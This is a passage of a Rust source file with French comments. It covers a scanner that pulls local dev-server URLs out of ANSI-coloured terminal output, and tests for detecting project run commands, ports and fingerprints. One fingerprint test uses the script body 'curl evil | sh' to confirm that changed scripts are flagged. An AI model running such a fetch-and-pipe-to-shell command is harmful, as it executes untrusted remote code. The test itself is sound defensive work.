                            changed |= self.end_line();
                        }
                    }
                },
                AnsiState::Esc => {
                    self.state = match b {
                        b'[' => AnsiState::Csi,
                        b']' | b'P' | b'_' | b'^' | b'X' => AnsiState::Str,
                        // Séquences à un octet de plus (`ESC ( B`…).
                        b'(' | b')' | b'*' | b'+' | b'#' | b'%' => AnsiState::Esc,
                        _ => AnsiState::Text,
                    };
                }
                AnsiState::Csi => {
                    if (0x40..=0x7e).contains(&b) {
                        self.state = AnsiState::Text;
                    }
                }
                AnsiState::Str => match b {
                    0x07 => self.state = AnsiState::Text,
                    0x1b => self.state = AnsiState::StrEsc,
                    _ => {}
                },
                AnsiState::StrEsc => {
                    self.state = if b == b'\\' {
                        AnsiState::Text
                    } else {
                        AnsiState::Str
                    };
                }
            }
        }
        changed
    }

    /// Fin du flux : la dernière ligne (sans fin de ligne) est examinée.
    pub fn finish(&mut self) -> bool {
        self.end_line()
    }

    fn end_line(&mut self) -> bool {
        if self.line.is_empty() {
            return false;
        }
        let text = String::from_utf8_lossy(&self.line).into_owned();
        self.line.clear();
        let mut changed = false;
        for url in extract_urls(&text) {
            if self.order.len() >= MAX_URLS {
                break;
            }
            if self.seen.insert(url.clone()) {
                self.order.push(url);
                changed = true;
            }
        }
        changed
    }
}

/// URL locales d'une ligne sans séquence ANSI : `localhost`, `127.0.0.1`,
/// `[::1]` (et `0.0.0.0` / `[::]`, publiées en `127.0.0.1` / `[::1]`) suivis
/// d'un port, avec ou sans `http(s)://`.
pub fn extract_urls(line: &str) -> Vec<String> {
    const HOSTS: &[(&str, &str)] = &[
        ("localhost", "localhost"),
        ("127.0.0.1", "127.0.0.1"),
        ("[::1]", "[::1]"),
        ("0.0.0.0", "127.0.0.1"),
        ("[::]", "[::1]"),
    ];
    let lower = line.to_ascii_lowercase();
    let b = lower.as_bytes();
    let mut found: Vec<(usize, String)> = Vec::new();
    for (host, shown) in HOSTS {
        let mut from = 0;
        while let Some(pos) = lower[from..].find(host) {
            let at = from + pos;
            from = at + host.len();
            let before = &lower[..at];
            let scheme = if before.ends_with("https://") {
                "https"
            } else if before.ends_with("http://") {
                "http"
            } else {
                // Sans schéma : le nom doit commencer un mot.
                if before.chars().last().is_some_and(|c| {
                    c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '/' | '@')
                }) {
                    continue;
                }
                "http"
            };
            let mut i = at + host.len();
            if b.get(i) != Some(&b':') {
                continue;
            }
            i += 1;
            let digits_start = i;
            while i < b.len() && b[i].is_ascii_digit() {
                i += 1;
            }
            let digits = &line[digits_start..i];
            let Ok(port) = digits.parse::<u32>() else {
                continue;
            };
            if digits.len() > 5 || port == 0 || port > 65_535 {
                continue;
            }
            // Un port collé à une lettre (`:3000abc`) n'en est pas un.
            if b.get(i).is_some_and(|c| c.is_ascii_alphabetic()) {
                continue;
            }
            let path_start = i;
            if b.get(i) == Some(&b'/') {
                while i < b.len() && url_char(b[i]) {
                    i += 1;
                }
            }
            let mut path = &line[path_start..i];
            while let Some(p) = path.strip_suffix(['.', ',', ';', ':', '!', '?', '\'', ')', ']']) {
                path = p;
            }
            let path = if path.is_empty() { "/" } else { path };
            found.push((at, format!("{scheme}://{shown}:{port}{path}")));
        }
    }
    found.sort_by_key(|(at, _)| *at);
    let mut out: Vec<String> = Vec::new();
    for (_, u) in found {
        if !out.contains(&u) {
            out.push(u);
        }
    }
    out
}

fn url_char(c: u8) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(
            c,
            b'-' | b'.'
                | b'_'
                | b'~'
                | b'/'
                | b'?'
                | b'#'
                | b'&'
                | b'='
                | b'%'
                | b'+'
                | b':'
                | b'@'
                | b'!'
                | b'$'
                | b','
                | b';'
                | b'*'
        )
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// Dépôt en mémoire.
    #[derive(Default)]
    struct Mem {
        files: HashMap<String, String>,
        dirs: BTreeSet<String>,
    }

    impl Mem {
        fn with(files: &[(&str, &str)]) -> Self {
            let mut m = Self::default();
            for (p, c) in files {
                m.files.insert((*p).to_owned(), (*c).to_owned());
                let mut d = String::new();
                for comp in p.split('/').collect::<Vec<_>>().split_last().unwrap().1 {
                    d = join(&d, comp);
                    m.dirs.insert(d.clone());
                }
            }
            m
        }
        fn children(&self, rel: &str, dirs: bool) -> Vec<String> {
            let prefix = if rel.is_empty() {
                String::new()
            } else {
                format!("{rel}/")
            };
            let mut out: BTreeSet<String> = BTreeSet::new();
            let it: Box<dyn Iterator<Item = &String>> = if dirs {
                Box::new(self.dirs.iter())
            } else {
                Box::new(self.files.keys())
            };
            for p in it {
                if let Some(rest) = p.strip_prefix(&prefix)
                    && !rest.contains('/')
                    && !rest.is_empty()
                {
                    out.insert(rest.to_owned());
                }
            }
            out.into_iter().collect()
        }
    }

    impl RepoView for Mem {
        fn read(&self, rel: &str) -> Option<String> {
            self.files.get(rel).cloned()
        }
        fn is_file(&self, rel: &str) -> bool {
            self.files.contains_key(rel)
        }
        fn is_dir(&self, rel: &str) -> bool {
            self.dirs.contains(rel)
        }
        fn subdirs(&self, rel: &str) -> Vec<String> {
            self.children(rel, true)
        }
        fn files(&self, rel: &str) -> Vec<String> {
            self.children(rel, false)
        }
    }

    fn ids(r: &[Runner]) -> Vec<&str> {
        r.iter().map(|r| r.id.as_str()).collect()
    }

    fn find<'a>(r: &'a [Runner], id: &str) -> &'a Runner {
        r.iter()
            .find(|x| x.id == id)
            .unwrap_or_else(|| panic!("{id} absent : {:?}", ids(r)))
    }

    #[test]
    fn package_json_scripts_and_manager() {
        let m = Mem::with(&[
            (
                "package.json",
                r#"{"scripts": {"dev": "vite", "test:unit": "vitest", "build": "vite build",
                    "predev": "x", "postinstall": "y", "--help": "z", "-x": "w", "lint": "eslint",
                    "deploy": "a", "a b": "c", "bad\u0007": "d", "num": 3}}"#,
            ),
            ("pnpm-lock.yaml", ""),
            ("app/package.json", r#"{"scripts": {"start": "next"}}"#),
        ]);
        let r = detect(&m);
        let dev = find(&r, "package.json:dev");
        assert_eq!(dev.command, ["pnpm", "run", "dev"]);
        assert_eq!(dev.kind, RunnerKind::Dev);
        assert_eq!(dev.cwd, "");
        assert_eq!(dev.source, "package.json:dev");
        assert_eq!(find(&r, "package.json:test:unit").kind, RunnerKind::Test);
        assert_eq!(find(&r, "package.json:build").kind, RunnerKind::Build);
        assert_eq!(find(&r, "package.json:lint").kind, RunnerKind::Lint);
        assert_eq!(find(&r, "package.json:deploy").kind, RunnerKind::Other);
        for absent in [
            "package.json:predev",
            "package.json:postinstall",
            "package.json:--help",
            "package.json:-x",
            "package.json:a b",
            "package.json:num",
        ] {
            assert!(!ids(&r).contains(&absent), "{absent}");
        }
        assert!(!r.iter().any(|x| x.id.contains('\u{7}')));
        // Sous-dossier : verrou de la racine.
        let app = find(&r, "app/package.json:start");
        assert_eq!(app.command, ["pnpm", "run", "start"]);
        assert_eq!(app.cwd, "app");
    }

    #[test]
    fn lockfiles_pick_the_manager() {
        for (lock, pm) in [
            ("yarn.lock", "yarn"),
            ("bun.lockb", "bun"),
            ("bun.lock", "bun"),
            ("package-lock.json", "npm"),
        ] {
            let m = Mem::with(&[("package.json", r#"{"scripts":{"dev":"x"}}"#), (lock, "")]);
            assert_eq!(detect(&m)[0].command[0], pm, "{lock}");
        }
        let m = Mem::with(&[(
            "package.json",
            r#"{"packageManager":"yarn@4.1.0","scripts":{"dev":"x"}}"#,
        )]);
        assert_eq!(detect(&m)[0].command[0], "yarn");
        let m = Mem::with(&[("package.json", r#"{"scripts":{"dev":"x"}}"#)]);
        assert_eq!(detect(&m)[0].command[0], "npm");
        // JSON illisible : rien, sans erreur.
        let m = Mem::with(&[("package.json", "{pas du json")]);
        assert!(detect(&m).is_empty());
    }

    #[test]
    fn makefile_targets() {
        let mk = "\
include common.mk
-include $(wildcard *.d)
.PHONY: all test release.notes
CC := gcc
FLAGS = -a:b
X ::= y
all: build test ## cible par défaut
build: src/main.c
\tgcc -o app src/main.c
test:
\t./run-tests
%.o: %.c
\tcc -c $<
$(OBJ): x
app.o: app.c
release.notes:
dist/app.js: x
-weird:
.SUFFIXES:
debug: CFLAGS = -g
define TEMPLATE
inside: x
endef
fmt lint&: ; true
long \\
  name: x
ifeq ($(A),b)
cond:
endif
";
        assert_eq!(
            make_targets(mk),
            [
                "all",
                "build",
                "test",
                "release.notes",
                "fmt",
                "lint",
                "long",
                "name",
                "cond"
            ]
        );
        let m = Mem::with(&[("Makefile", mk), ("GNUmakefile", "only:\n")]);
        // GNU make prend GNUmakefile en premier.
        let r = detect(&m);
        assert_eq!(ids(&r), ["GNUmakefile:only"]);
        assert_eq!(r[0].command, ["make", "only"]);
    }

    #[test]
    fn justfile_recipes() {
        let jf = r#"
set shell := ["bash", "-c"]
alias b := build
version := "1.0"
export RUST_LOG := "debug"

# Construit.
build:
    cargo build

@test filter="":
    cargo test {{filter}}

deploy env:
    ./deploy {{env}}

serve port="8080" host='127.0.0.1':
    ./serve

watch *args:
    ./watch {{args}}

publish +targets:
    ./publish

_helper:
    true

[private]
secret:
    true

[group('ci')]
lint: build
    cargo clippy

quoted arg="a: b":
    echo

paren x=(env("A", "b:c")):
    echo
"#;
        assert_eq!(
            just_recipes(jf),
            ["build", "test", "serve", "watch", "lint", "quoted", "paren"]
        );
        let m = Mem::with(&[("justfile", jf)]);
        let r = detect(&m);
        assert_eq!(find(&r, "justfile:test").command, ["just", "test"]);
        assert_eq!(find(&r, "justfile:test").kind, RunnerKind::Test);
    }

    #[test]
    fn cargo_package_and_workspace() {
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"seul\"\n"),
            ("src/main.rs", "fn main(){}"),
        ]);
        let r = detect(&m);
        assert_eq!(
            ids(&r),
            ["Cargo.toml:run", "Cargo.toml:test", "Cargo.toml:build"]
        );
        assert_eq!(find(&r, "Cargo.toml:run").command, ["cargo", "run"]);

        // Bibliothèque seule : pas de `cargo run`.
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"lib\"\n"),
            ("src/lib.rs", ""),
        ]);
        assert!(!ids(&detect(&m)).contains(&"Cargo.toml:run"));

        let m = Mem::with(&[
            (
                "Cargo.toml",
                "[workspace]\nmembers = [\"crates/*\", \"tools/cli\", \"../dehors\", \"x/**\"]\nexclude = [\"crates/old\"]\n",
            ),
            (
                "crates/core/Cargo.toml",
                "[package]\nname = \"core\"\n[[bin]]\nname = \"orchd\"\n",
            ),
            ("crates/lib/Cargo.toml", "[package]\nname = \"lib\"\n"),
            ("crates/lib/src/lib.rs", ""),
            ("crates/old/Cargo.toml", "[package]\nname = \"old\"\n"),
            ("crates/old/src/main.rs", ""),
            ("crates/bad/Cargo.toml", "[package]\nname = \"--bad\"\n"),
            ("crates/bad/src/main.rs", ""),
            ("tools/cli/Cargo.toml", "[package]\nname = \"cli\"\n"),
            ("tools/cli/src/main.rs", ""),
        ]);
        let r = detect(&m);
        assert_eq!(
            ids(&r),
            [
                "Cargo.toml:test",
                "Cargo.toml:build",
                "Cargo.toml:run:core",
                "Cargo.toml:run:cli",
            ]
        );
        assert_eq!(
            find(&r, "Cargo.toml:run:core").command,
            ["cargo", "run", "-p", "core"]
        );
        assert_eq!(
            find(&r, "Cargo.toml:test").command,
            ["cargo", "test", "--workspace"]
        );
    }

    #[test]
    fn go_compose_pyproject() {
        let m = Mem::with(&[
            ("go.mod", "module x\n"),
            ("main.go", "// c\npackage main\n"),
            ("main_test.go", "package main\n"),
            ("compose.yaml", "services: {}\n"),
            ("docker-compose.yml", "services: {}\n"),
            (
                "pyproject.toml",
                "[project]\nname = \"p\"\n[project.scripts]\nserve = \"p:main\"\n\"-x\" = \"p:x\"\n",
            ),
            ("uv.lock", ""),
        ]);
        let r = detect(&m);
        assert_eq!(find(&r, "go.mod:run").command, ["go", "run", "."]);
        assert_eq!(find(&r, "go.mod:test").command, ["go", "test", "./..."]);
        assert_eq!(
            find(&r, "compose.yaml:up").command,
            ["docker", "compose", "-f", "compose.yaml", "up"]
        );
        assert!(!ids(&r).contains(&"docker-compose.yml:up"));
        assert_eq!(
            find(&r, "pyproject.toml:serve").command,
            ["uv", "run", "serve"]
        );
        assert!(!ids(&r).contains(&"pyproject.toml:-x"));

        // Go sans paquet main : pas de `go run .`.
        let m = Mem::with(&[("go.mod", "module x\n"), ("lib.go", "package lib\n")]);
        assert!(!ids(&detect(&m)).contains(&"go.mod:run"));

        // pyproject sans verrou ni outil : rien (jamais deviné).
        let m = Mem::with(&[(
            "pyproject.toml",
            "[project]\nname = \"p\"\n[project.scripts]\nserve = \"p:main\"\n",
        )]);
        assert!(detect(&m).is_empty());
        // poetry déclaré, scripts de pdm.
        let m = Mem::with(&[(
            "pyproject.toml",
            "[tool.poetry]\nname = \"p\"\n[tool.poetry.scripts]\napp = \"p:main\"\n[tool.pdm.scripts]\nlint = \"ruff .\"\n",
        )]);
        let r = detect(&m);
        assert_eq!(
            find(&r, "pyproject.toml:app").command,
            ["poetry", "run", "app"]
        );
        assert_eq!(
            find(&r, "pyproject.toml:lint").command,
            ["pdm", "run", "lint"]
        );
    }

    #[test]
    fn skipped_subdirs_and_toml_errors() {
        let m = Mem::with(&[
            ("node_modules/x/package.json", r#"{"scripts":{"dev":"x"}}"#),
            ("node_modules/package.json", r#"{"scripts":{"dev":"x"}}"#),
            (".hidden/package.json", r#"{"scripts":{"dev":"x"}}"#),
            ("Cargo.toml", "pas = [du toml"),
        ]);
        assert!(detect(&m).is_empty());
    }

    #[test]
    fn bodies_and_fingerprints() {
        let mk = "all: build\nbuild: src\n\tcc -o app\n\n# c\n\tstrip app\nX = 1\n\techo orpheline\nbuild: more\n";
        assert_eq!(
            make_rules(mk),
            [
                ("all".to_owned(), "all: build".to_owned()),
                (
                    "build".to_owned(),
                    "build: src\n\tcc -o app\n\tstrip app\nbuild: more".to_owned()
                ),
            ]
        );
        let jf = "build:\n    cargo build\n\n    echo fin\n\ntest:\n    cargo test\n";
        assert_eq!(
            just_rules(jf),
            [
                (
                    "build".to_owned(),
                    "build:\n    cargo build\n\n    echo fin".to_owned()
                ),
                ("test".to_owned(), "test:\n    cargo test".to_owned()),
            ]
        );
        let pkg = |body: &str| {
            Mem::with(&[
                (
                    "package.json",
                    &format!(r#"{{"scripts":{{"dev":"{body}"}}}}"#),
                ),
                ("pnpm-lock.yaml", ""),
            ])
        };
        let a = &detect(&pkg("vite"))[0];
        assert_eq!(a.body, "vite");
        assert_eq!(a.lock.as_deref(), Some("pnpm-lock.yaml"));
        assert_eq!(a.fingerprint().len(), 64);
        // Même commande, autre corps : autre empreinte.
        let b = &detect(&pkg("curl evil | sh"))[0];
        assert_eq!(a.command, b.command);
        assert_ne!(a.fingerprint(), b.fingerprint());
        // Autre verrou : autre empreinte.
        let c = &detect(&Mem::with(&[
            ("package.json", r#"{"scripts":{"dev":"vite"}}"#),
            ("yarn.lock", ""),
        ]))[0];
        assert_ne!(a.fingerprint(), c.fingerprint());
        // Cargo : la commande seule ; compose : le fichier.
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"x\"\n"),
            ("src/main.rs", ""),
            ("compose.yaml", "services:\n  web: {}\n"),
        ]);
        let r = detect(&m);
        assert_eq!(find(&r, "Cargo.toml:run").body, "cargo run");
        assert_eq!(find(&r, "compose.yaml:up").body, "services:\n  web: {}\n");
        // Corps montré borné, empreinte sur le corps entier.
        let mut long = a.clone();
        long.body = "é".repeat(MAX_BODY_SHOWN);
        let (shown, cut) = long.shown_body();
        assert!(cut && shown.len() <= MAX_BODY_SHOWN && shown.len() > MAX_BODY_SHOWN - 2);
    }

    #[test]
    fn classification() {
        assert_eq!(classify("dev"), RunnerKind::Dev);
        assert_eq!(classify("start:prod"), RunnerKind::Dev);
        assert_eq!(classify("serve"), RunnerKind::Dev);
        assert_eq!(classify("test-e2e"), RunnerKind::Test);
        assert_eq!(classify("e2e"), RunnerKind::Test);
        assert_eq!(classify("typecheck"), RunnerKind::Lint);
        assert_eq!(classify("Build"), RunnerKind::Build);
        assert_eq!(classify("deploy"), RunnerKind::Other);
    }

    #[test]
    fn ports() {
        let p = preferred_port(Path::new("/home/u/projet--feature"));
        assert!((PORT_MIN..=PORT_MAX).contains(&p));
        assert_eq!(p, preferred_port(Path::new("/home/u/projet--feature")));
        let reserved: HashSet<u16> = [p].into();
        let next = pick_port(p, &reserved, |q| {
            q == p + 1 || (p == PORT_MAX && q == PORT_MIN)
        });
        assert!(next.is_some_and(|n| n != p && n != p + 1));
        assert_eq!(
            pick_port(PORT_MAX, &HashSet::new(), |q| q == PORT_MAX),
            Some(PORT_MIN)
        );
        assert_eq!(pick_port(PORT_MIN, &HashSet::new(), |_| true), None);
    }

    #[test]
    fn urls_in_output() {
        assert_eq!(
            extract_urls("  ➜  Local:   http://localhost:5173/"),
            ["http://localhost:5173/"]
        );
        assert_eq!(
            extract_urls("listening on 127.0.0.1:8080, see https://[::1]:8443/app?x=1."),
            ["http://127.0.0.1:8080/", "https://[::1]:8443/app?x=1"]
        );
        assert_eq!(
            extract_urls("Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C)"),
            ["http://127.0.0.1:8000/"]
        );
        assert!(
            extract_urls("notlocalhost:3000 localhost: 3000 localhost:99999 localhost:80a")
                .is_empty()
        );
        assert!(extract_urls("http://example.com:3000/").is_empty());
        assert_eq!(
            extract_urls("http://LOCALHOST:3000/Path"),
            ["http://localhost:3000/Path"]
        );
    }

    #[test]
    fn scanner_strips_ansi_across_chunks() {
        let mut s = UrlScanner::new();
        // Vite colore le port : séquences au milieu de l'URL, coupées entre
        // deux lectures ; titre OSC et lien OSC 8 autour.
        let out = b"\x1b]0;titre\x07  \x1b[32m\xe2\x9e\x9c\x1b[39m  Local:   \x1b[36mhttp://localhost:\x1b[1m51";
        assert!(!s.feed(out));
        assert!(s.feed(b"73\x1b[22m/\x1b[39m\r\n"));
        assert_eq!(s.urls(), ["http://localhost:5173/"]);
        // Doublon : rien de nouveau.
        assert!(!s.feed(b"http://localhost:5173/\n"));
        // Dernière ligne sans fin de ligne.
        assert!(!s.feed(b"\x1b]8;;http://x\x1b\\lien\x1b]8;;\x1b\\ 127.0.0.1:9000"));
        assert!(s.finish());
        assert_eq!(
            s.urls(),
            ["http://localhost:5173/", "http://127.0.0.1:9000/"]
        );
    }

    #[test]
    fn unterminated_sequences_do_not_swallow_the_output() {
        // OSC jamais terminé, abandonné sur CAN : la ligne suivante compte.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b]0;titre sans fin\x18\nhttp://localhost:3000/\n");
        assert_eq!(s.urls(), ["http://localhost:3000/"]);
        // DCS abandonné sur SUB.
        let mut s = UrlScanner::new();
        s.feed(b"\x1bPq#0;2;0;0;0\x1a http://localhost:3001/\n");
        assert_eq!(s.urls(), ["http://localhost:3001/"]);
        // Chaîne sans fin ni CAN : abandonnée après 4 096 octets.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b]8;;");
        s.feed(&vec![b'x'; MAX_SEQUENCE + 1]);
        s.feed(b"\nhttp://127.0.0.1:4000/\n");
        assert_eq!(s.urls(), ["http://127.0.0.1:4000/"]);
        // CSI interminable (paramètres seulement) : idem.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b[");
        s.feed(&vec![b'1'; MAX_SEQUENCE + 1]);
        s.feed(b"\nhttp://localhost:4001/\n");
        assert_eq!(s.urls(), ["http://localhost:4001/"]);
    }

    #[test]
    fn scanner_is_bounded() {
        let mut s = UrlScanner::new();
        for p in 1..40 {
            s.feed(format!("http://localhost:{}\n", 3000 + p).as_bytes());
        }
        assert_eq!(s.urls().len(), MAX_URLS);
        // Une ligne interminable ne fait pas grossir le tampon.
        s.feed(&vec![b'a'; 10 * MAX_LINE]);
        assert!(s.line.len() < MAX_LINE);
    }
}
